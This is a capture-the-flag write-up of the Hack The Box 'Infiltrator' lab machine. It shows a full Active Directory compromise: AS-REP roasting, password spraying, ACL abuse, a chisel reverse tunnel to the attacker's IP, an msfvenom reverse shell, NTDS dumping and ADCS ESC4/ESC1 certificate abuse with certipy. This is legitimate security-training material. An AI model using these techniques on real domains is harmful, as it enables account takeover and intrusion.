---
title: "Infiltrator [INSANE]"
date: 17-06-2025 00:00:00 +0800
categories: [HTB, Active Directory, Insane]
tags: [HTB, Active Directory, Insane]
author: 0xB3L14L
description: Machine focused on Active Directory attacks, port forwarding, and enumeration of a messaging application.
lang: en
permalink: /posts/Infiltrator
image:
  path: /Media/Images/Infiltrator/Infiltrator.webp
---

To solve this machine, it is recommended to have Windows.

## Initial Enumeration

### NMAP Scan

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Infiltrator.htb
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-11 21:38:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-06-11T21:42:32+00:00; -3d07h15m12s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-06-11T21:42:30+00:00; -3d07h15m12s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-11T21:42:31+00:00; -3d07h15m12s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-11T21:42:30+00:00; -3d07h15m12s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2025-06-03T14:17:24
|_Not valid after:  2025-12-03T14:17:24
|_ssl-date: 2025-06-11T21:42:30+00:00; -3d07h15m12s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-11T21:41:31+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
15220/tcp open  unknown
15223/tcp open  unknown
15230/tcp open  unknown
49666/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
49878/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:window
```
Of all ports, there are some that stand out:
- 80 (Website)
- 3389 (RDP Connection available)
- 15220, 15223, 15230 (Uncommon ports in an AD environment)

### Website
Directory enumeration and subdomain enumeration were attempted, but there were no results.
![Website](/Media/Images/Infiltrator/website.png)
However, within the main page, there is a section called **Digital Team** with several names of people. These could be the users belonging to the Infiltrator domain. Their names are copied, totaling 7.

### Create a user list - UsernameAnarchy
The username anarchy tool is used for creating usernames.

![Username-anarchy](/Media/Images/Infiltrator/anarchy.png)

With the list ready, valid usernames must be tested.

## Kerbrute - Find valid users
With Kerbrute, valid user accounts can be enumerated through Kerberos pre-authentication, by comparing the error message sent by the KDC.
![Kerbrute](/Media/Images/Infiltrator/kerbrute.png)

Done, the user accounts are obtained. Without credentials, one can check if there are **ASREProastable** users.

## ASREP Roasting

![asrep](/Media/Images/Infiltrator/asrep.png)

And one was found: **l.clark**

It can be cracked with hashcat.

![hashcat](/Media/Images/Infiltrator/hashcat.png)

Their password is: **WAT?watismypass!**

## Password Spray
The user **l.clark** was enumerated unsuccessfully. So, a password spray can be attempted to see if there is another user with the same password. BUT THERE IS A DRAWBACK.
Both **d.anderson** and **m.harris** are [protected users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group).

Authentication is limited, but it's not a big problem. It can be checked if the password is valid using kerbrute again.

The user **d.anderson** uses the same password.

## TGT - d.anderson (Protected User)
To avoid issues and be able to authenticate as **d.anderson**, his TGT is requested.
It is exported as an environment variable.
And the realm is configured in **/etc/krb5.conf**. (This will be useful in the future)
```bash
[domain_realm]
.infiltrator.htb = INFILTRATOR.HTB
infiltrator.htb = INFILTRATOR.HTB

[libdefaults]
default_realm = INFILTRATOR.HTB
dns_lookup_realm = false
dns_lookup_kdc = true
ticket_lifetime = 24h
forwardable = true

[realms]
INFILTRATOR.HTB = {
kdc = DC01.INFILTRATOR.HTB
admin_server = DC01.INFILTRATOR.HTB
default_domain = INFILTRATOR.HTB
}
```
Ready, you can now enumerate with this user. First with **bloodhound**.

## ACL Abuse - GenericAll on OU
The user **d.anderson** has the ACE GenericAll on an OU. And within this, there is a user.
![GenericAll](/Media/Images/Infiltrator/genericall.png)
To exploit it, all objects belonging to the OU can inherit the ACE from **d.anderson**.
![inheritance](/Media/Images/Infiltrator/inheritance.png)
Well, now it can be said that **d.anderson** has the ACE GenericAll on the user **e.rodriguez**. Among all the available attacks, the easiest is to change the password.
![PasswordChange](/Media/Images/Infiltrator/password.png)

## ACL Abuse - AddSelf
**E.rodriguez** can be added to the **CHIEF MARKETING** group.
![AddSelf](/Media/Images/Infiltrator/addself.png)
This can be done with **bloodyAD**
![BloodyAD-Add](/Media/Images/Infiltrator/bloodyadd.png)

## ACL Abuse - ForceChangePassword
This group has the ACE **ForceChangePassword** on the user m.harris
![Password2](/Media/Images/Infiltrator/password2.png)

Then, the password is changed.

![change](/Media/Images/Infiltrator/change.png)

Remembering that **m.harris** also belongs to the **Protected Users** group, his TGT is obtained.

![tgt2](/Media/Images/Infiltrator/tgt2.png)

With this user, you can access with evil-winrm and obtain the **user flag**.

# Root

This is where the machine gets complicated, not so much in exploiting attacks, but in enumerating a messaging application.

## Internal Enumeration - OutputMessenger
Enumerating users, the following is found.

![turner-pass](/Media/Images/Infiltrator/tuner-pass.png)

Some possible credentials, but testing with user **k.turner** did not work. Continuing to enumerate, several open ports are found internally.

![ports](/Media/Images/Infiltrator/internal-ports.png)

And they seem to be related to the ports that were found at the beginning of the scan. Searching for the PID to find the responsible process shows:

![process](/Media/Images/Infiltrator/process.png)

They belong to a program called [**OutputMessenger**](https://www.outputmessenger.com/). A messaging program.

The creds for **k.turner** may be for logging into this program. So, I need to gain access through port forwarding.

## Port-Forwarding
I did it with chisel.
```powershell
.\chisel_windows.exe client 10.10.14.107:8000 R:14118:127.0.0.1:14118 R:14119:127.0.0.1:14119 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14124:127.0.0.1:14124 R:14125:127.0.0.1:14125 R:14126:127.0.0.1:14126 R:14127:127.0.0.1:14127 R:14128:127.0.0.1:14128 R:14130:127.0.0.1:14130 R:14406:127.0.0.1:14406
```
And from a Windows (Commando-VM) I connect using the IP of my Kali, for this I download the client version app of OutputMessenger.

## Enumerate OutputMessenger as k.turner
Inside it shows information about a program they are developing **UserExplorer**.

In the Output Wall section (They show Updates of the program) the credentials of user m.harris are present: **D3v3l0p3r_Pass@1337!**
![Harris-pass](/Media/Images/Infiltrator/harris-pass.png)

## Enumerate OutputMessenger as m.harris
This user seems to be the developer of the program **UserExplorer**, he has a conversation with the admin regarding the program.
![Harris-chat](/Media/Images/Infiltrator/harris-chat.png)

The program can be downloaded, upon reviewing it indicates that it is a .Net and when decompiling it with **Ilspy**. In the **main** function, the following is found:
![Main](/Media/Images/Infiltrator/main.png)

The encrypted credentials of user **winrm_svc**.

Searching, the **DecryptString** function appears.
![decrypt](/Media/Images/Infiltrator/decrypt.png)

## Decrypting AES
The process is first Base64, and then AES. So, this can be done repeatedly until obtaining the credentials in plain text. For this, CyberChef can be used.

![CyberChef](/Media/Images/Infiltrator/winrm-pass.png)

## Enumerate OutputMessenger as winrm_svc
This user is a service account, as indicated by the name, and can log in using winrm. Additionally, within OutputMessenger, there is a note indicating an API KEY.
![note](/Media/Images/Infiltrator/note.png)

And there is a conversation with the user **o.martinez**, who indicates that they shared their password in the group **Chiefs_Marketing_chat**.
![winrm-chat](/Media/Images/Infiltrator/winrm-chat.png)

The documentation explains that the logs of group conversations can be extracted; for this, the API KEY is needed for authentication, along with the group roomkey.

Within the directory **C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA**, there is a sqlite3 database.

![om3](/Media/Images/Infiltrator/om3.png)

Upon downloading it and viewing the data, the roomkey can be found.

![chatroom](/Media/Images/Infiltrator/chatroom.png)

Now the group logs are being viewed.
```bash
curl -s 'http://127.0.0.1:14125/api/chatrooms/log?roomkey=20240220014618@conference.com&fromdate=2000/01/01&todate=2026/01/01' -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" | jq .
```

And the credentials of **o.martinez** appear.

## Enumeration as o.martinez
The found creds only serve to log into the application, but there is nothing important.

The OutputMessenger documentation indicates that in the **Calendar** section, events for different actions can be set, and the most important action is **Run Application**. This action allows the execution of a program.

So, an executable is created with msfvenom and it is uploaded to the **C:\Temp** directory.

![revshell](/Media/Images/Infiltrator/revshell.png)

And it is specified in the event; in my case, it gave an error because it couldn't find it.

This was because it was looking for it on my Windows, and looking at the user profile shows that they are logged in on two devices: On DC01 (Machine), and on COMMANDO (My Windows).

![profile](/Media/Images/Infiltrator/profile.png)

To evade that problem, I also placed the reverse shell on my Windows, in the same path (I had to create the Temp directory). The program does not indicate which device it searches for the executable, so it likely tries to look for it on both, and that’s how it was.

### PCAP Analysis
Inside, as **o-martinez**, searching in the same directory where the OutputMessenger information is located, there is a pcap file.

![pcap](/Media/Images/Infiltrator/pcap.png)

When bringing it to Kali and using Wireshark, the password for **o.martinez** appears. And this user can log in via RDP.
![rdp-pass](/Media/Images/Infiltrator/rdp-pass.png)

Continuing to explore the pcap, it shows a 7z compressed file of a BitLocker backup.
![wireshark](/Media/Images/Infiltrator/wireshark.png)

It can be exported from the pcap.

![export](/Media/Images/Infiltrator/export.png)

When trying to decompress it, it asks for a password, so it needs to be cracked.

![7z-pass](/Media/Images/Infiltrator/7z-pass.png)

### 7z Cracking
The compressed file is converted into a hash with John.

![7z2john](/Media/Images/Infiltrator/7z2john.png)

And it is cracked.

![7z-cracked](/Media/Images/Infiltrator/7z-cracked.png)

The password is **zipper**.

A folder is created, and inside there is an **html** file, an http server is set up with Python, and the html is viewed.

![recover](/Media/Images/Infiltrator/recover.png)

A BitLocker recovery key appears.

### BitLocker Drive
This drive can be accessed by the user **o.martinez** via RDP.
![drive](/Media/Images/Infiltrator/drive.png)

Inside the Administrator user's documents, there is another compressed file that according to its name contains credentials.

![creds](/Media/Images/Infiltrator/creds.png)

When bringing it to Kali and decompressing it, it reveals three files: NTDS, SECURITY, and SYSTEM. So with **secretsdump** you can obtain the content of the NTDS to see the user hashes.
![secretsdump](/Media/Images/Infiltrator/secretsdump.png)

Unfortunately, none of them work; this is due to it being an old backup.

Another option is to enumerate it as SQLite to see what other information it contains. This is done with [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite/tree/main).

![tool](/Media/Images/Infiltrator/tool.png)

### Enumerate sqlite3 DB
Several tables are found, one of which is user_accounts.

![tables](/Media/Images/Infiltrator/tables.png)

This table has several columns.

![columns](/Media/Images/Infiltrator/columns.png)

Enumerating them, it is discovered that in the description of the user **lan_management** there are some credentials. And when tested, they are valid.

![lan-pass](/Media/Images/Infiltrator/lan-pass.png)

## ACL Abuse - ReadGMSAPassword
Re-enumerating the environment, the user **lan_managment** has the ACE ReadGMSAPassword over the user **infiltrator_svc**.

![gmsa](/Media/Images/Infiltrator/gmsa.png)

It is exploited and the NTHASH of that user is obtained.

![hash](/Media/Images/Infiltrator/hash.png)

## ADCS Abuse - ESC4
As the user **infiltrator_svc**, it can be seen if there is a vulnerable certificate template.
```bash
certipy-ad find -u 'infiltrator_svc$@infiltrator.htb' -hashes ':653b2726881d6e5e9ae3690950f9bcc4' -dc-ip 10.10.11.31 -vulnerable -stdout
```

There is one, called **Infiltrator_Template**, and it is vulnerable to ESC4 (Template Hijacking). This allows the user to modify the template configurations.

To exploit this type, the template is first modified to have the configurations of one with a vulnerable state, such as ESC1. This is achieved with the **-write-default-configuration** option.

![esc4](/Media/Images/Infiltrator/esc4.png)

Now it is vulnerable to ESC1, allowing the request for a certificate from a privileged user such as the administrator. For this, their UPN and SID must be provided.

![esc1](/Media/Images/Infiltrator/esc1.png)

Finally, authentication is performed using the obtained certificate.

![auth](/Media/Images/Infiltrator/auth.png)

This will grant access as the administrator user.

![admin](/Media/Images/Infiltrator/admin.png)

The machine has already been compromised, and the root flag can be read.